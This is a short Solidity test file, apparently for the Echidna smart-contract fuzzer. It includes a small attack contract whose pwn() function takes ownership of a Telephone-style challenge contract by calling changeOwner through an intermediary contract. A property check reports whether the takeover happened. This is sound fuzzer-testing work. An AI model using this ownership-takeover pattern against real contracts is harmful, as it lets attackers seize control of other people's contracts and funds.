pragma solidity ^0.5.0;

import 'contract.sol';

contract RingRing {
  Test phone = Test(0x1337);

  function pwn() public {
    phone.changeOwner(address(0xf00d));
  }
}

contract Test is Telephone {
  constructor() Telephone() public {
    // hint echidna
    new RingRing();
  }

  function echidna_test_owner() public returns (bool) {
    return owner == msg.sender;
  }
}
